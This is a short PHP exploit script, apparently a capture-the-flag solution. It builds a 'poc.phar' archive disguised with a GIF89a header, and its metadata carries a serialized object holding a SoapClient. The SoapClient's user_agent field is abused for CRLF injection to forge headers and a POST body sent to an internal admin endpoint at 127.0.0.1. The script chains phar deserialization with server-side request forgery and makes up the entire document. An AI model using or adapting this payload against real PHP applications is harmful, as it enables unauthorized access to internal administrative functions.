<?php
class create_treehole{
    public $path;
    public $realpath = "";
    public $complaint = "";
    public $test;
}
$target = 'http://127.0.0.1/admin/auth.php';
$data = "salt=mochu7";
$headers = array(
 'Header1: Values',
 'Header2: Values2'
);
$o = new SoapClient(null,array('location'=>$target,'user_agent'=>"testAgent\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($data)."\r\n\r\n".$data,'uri'=>'abc'));
$a = new create_treehole();
$a->test = $o;
$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");//设置stub, 增加gif文件头，伪造文件类型
$phar->setMetadata($a); //将自定义meta-data存入manifest
$phar->addFromString("mochu7.txt", "mochu7"); //添加要压缩的文件
$phar->stopBuffering();